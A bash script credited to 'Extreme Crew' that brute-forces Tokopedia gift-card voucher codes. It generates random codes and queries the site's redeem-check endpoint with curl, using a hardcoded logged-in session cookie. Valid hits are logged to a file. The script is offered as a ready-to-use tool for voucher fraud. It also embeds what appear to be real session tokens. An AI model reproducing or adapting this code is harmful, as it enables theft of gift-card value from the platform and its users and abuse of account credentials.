#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ1ODY2MHxJblp1ZVU4MFRteHJObkl4YzBOTGFVSXpNRk5rUWtSek0zcHlTREY0TDJKVGNGRjJSRTl0TDNORk4xRTlJZ289fCwPkuHXEF0PwQOyvYO0xPEQqTHJ7SPEzUA29aNk14u8; __auc=e527c7c6162cbc252cd8723769e; _ga=GA1.2.1225884301.1523836933; _ampUITN=0a1e0ed831botd7049d9c3636-30798-1523836933956; _ampNV=1; _ga=GA1.3.1225884301.1523836933; __asc=f08ce0c6162f251aefedff1142f; pulsa-aff=undefined; _gid=GA1.2.2109614528.1524483862; _dc_gtm_UA-9801603-23=1; _ampSES=829c9f0fb8SESdffaf1dc4848-30798-1524483863326; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZjg3ZmIyYTctMDM3NC00MGM2LWE3NjctZDUzNGVkNDcwNTcwIiwiaXNfYWpheCI6ZmFsc2V9; _SID_Tokopedia_=GgNolrqRtn-jPeKDmn6X2dLn7hs1iL2U9knA1dI_03tXecATXwN5tUFpginQ8acca03E9eCLWy5ACYR3i6-L-JmPi6RloQpcw02yxg98krn_R8FGEKypTs1NjiOyldy8; l=1; _uetsid=_uet1baec5aa; _gid=GA1.3.2109614528.1524483862; _gat_UA-9801603-23=1; _ampCon=-; _ampCity=-"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
